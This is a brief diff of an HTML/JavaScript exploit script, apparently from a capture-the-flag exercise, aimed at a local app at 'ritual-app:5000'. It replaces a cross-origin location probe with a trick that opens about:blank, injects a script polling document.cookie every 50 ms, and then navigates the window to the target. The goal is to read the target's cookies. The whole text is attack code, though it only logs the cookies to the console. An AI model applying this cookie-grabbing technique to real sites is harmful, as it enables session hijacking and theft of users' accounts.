@@ -1,12 +1,15 @@
 <script>
-let w = open("http://ritual-app:5000/");
+let w = open("about:blank");
 
+w.document.write(`
+<script>
 setInterval(()=>{
-  try{
-    console.log("TRY")
-    console.log(w.location.href)
-  }catch(e){
-    console.log("blocked")
-  }
-},100)
+    try{
+        console.log(document.cookie)
+    }catch(e){}
+},50)
+<\/script>
+`);
+
+w.location = "http://ritual-app:5000/";
 </script>
